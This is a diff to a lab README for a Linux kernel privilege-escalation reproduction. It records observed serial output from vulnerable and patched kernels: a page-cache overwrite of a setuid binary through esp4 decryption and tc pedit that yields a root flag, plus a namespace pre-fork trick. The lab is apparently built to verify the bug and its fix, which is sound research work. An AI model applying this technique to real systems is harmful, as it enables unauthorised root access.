@@ -98,20 +98,25 @@ page cache only, on both flavors.
 
 ## Observed output
 
-**expected — populated by the verification runs** (the sections below
-describe what the deterministic markers look like; this repository does
-not claim observed evidence until the runs are recorded here).
+**Observed 2026-10-27** (Docker + QEMU/KVM, 8 cores; full logs in
+`lab/out/logs/serial-{vuln,patched}.txt`). Both flavors closed the
+oracle end to end, running the tools as real uid 1000:
 
-Expected `vuln` serial tail:
+```
+RESULT flavor=vuln    mode=kvm qemu_rc=0 time=11s BOOT=ok DETECTOR=vulnerable      LPE=root           DISKCLEAN=ok VERDICT=ok
+RESULT flavor=patched mode=kvm qemu_rc=0 time=12s BOOT=ok DETECTOR=not-detected   LPE=not-vulnerable DISKCLEAN=ok VERDICT=ok
+```
+
+Observed `vuln` serial tail:
 
 ```
 LAB-BOOT-OK 7.2 FLAVOR=vuln
 PROBE-DISK ext4 /dev/vda
 SG-STAGED path=/usr/bin/secretgate backing=ext4:/labbin/secretgate mode=4755
-RUNAS setpriv uid=1000
-DETECTOR-RESULT: VULNERABLE ...
+RUNAS su lab (uid=1000)
+DETECTOR-RESULT: VULNERABLE (in-place decrypt wrote over self-owned read-only page-cache page)
 DETECTOR-RC=0
-LPE-START uid=1000 euid=1000 target=/usr/bin/secretgate gate_off=...
+LPE-START uid=1000 euid=1000 target=/usr/bin/secretgate gate_off=500016
 LPE-SHA256-BEFORE ...
 LPE-CRYPTO aes128=PASS sha256=PASS
 LPE-USERNS unshare=OK uid=0 euid=0 (ns-root, fresh netns)
@@ -125,19 +130,20 @@ LPE-TC device=nlmon0 hook=egress classifier=u32 pedit_keys=24 redirect=lo status
 LPE-SELFTEST inner_udp=received (len=528)
 LPE-TRIGGER sent=522 target_spliced=8 vector_spliced=514
 LPE-DIVERGED yes (bytes 474154454f50454e)          <- "GATEOPEN"
-LPE-SHA256-AFTER ...
 LPE-EXEC SECRETGATE euid=0 gate=GATEOPEN
+LPE-DISK fadvise=DONTNEED bytes-after-evict=474154454f50454e (page-cache poison survives eviction on this kernel)
 LPE-RESULT: ROOT-FLAG-CAPTURED flag{zerofrag-lpe-in-lab}
 LPE-RC=0
 LAB-DONE
 ```
 
-Expected `patched` differences (same chain runs, same decrypt fires, but
+Observed `patched` differences (same chain runs, same decrypt fires, but
 `skb_zerocopy()` propagated the marker so esp4 input copies the frags):
 
 ```
-DETECTOR-RESULT: NOT-DETECTED ...
+DETECTOR-RESULT: NOT-DETECTED (no page-cache divergence; skb_cow_data unshared the frags or a copy path was taken)
 LPE-DIVERGED no (bytes 474154454c4f434b)           <- still "GATELOCK"
+LPE-SHA256-AFTER 04b694eaf56e11d0c5846f713e0e7d28cc5c163f042c2f88e480da5038a568f46   (== BEFORE)
 LPE-EXEC SECRETGATE euid=0 gate=GATELOCK
 LPE-RESULT: NOT-VULNERABLE (no page-cache divergence — skb_zerocopy() propagated SKBFL_SHARED_FRAG)
 LPE-RC=1
@@ -163,14 +169,24 @@ one hard-coded target — `/usr/bin/secretgate` (allowlist: path +
 `S_ISREG` + `S_ISUID` + root-owned, verified before anything else) —
 rewriting its gate magic `GATELOCK` → `GATEOPEN` in the page cache, then
 execs the SUID binary as uid 1000, which reads the root-only flag.
+The exec happens through an assistant pre-forked **before** the
+namespace drop: the kernel ignores the SUID bit for execs inside a user
+namespace whose id map does not cover the file's owner, so the child
+stays uid 1000 in the initial user namespace where the bit is honored
+(measured both ways in this lab).
 Exit codes: 0 = `ROOT-FLAG-CAPTURED`, 1 = `NOT-VULNERABLE`,
 2 = `FAILED`. It sets no capabilities and needs none.
 
 ## Timings
 
-TBD — populated by the verification runs (budget: Docker image build a
-few minutes; tarball download ~145 MB; each kernel build the dominant
-cost; each boot + oracle a few seconds with KVM, more under TCG).
+Observed 2026-10-27 (8 cores, KVM): Docker image build ~2 min; tarball
+download ~30 s (cached afterwards); each kernel build ~8.5 min (both
+flavors from one tree ~17 min the first time; cached re-runs skip
+straight to tools + initramfs, seconds); each boot + full oracle
+~11-12 s (`vuln`) / ~12 s (`patched`) with KVM. `tc action pedit
+offset N out of bounds` lines in the serial are expected: pedit keys
+beyond short tapped skbs are skipped harmlessly (the frame rewrite
+still lands, as `LPE-DIVERGED` proves).
 
 ## Notes
 
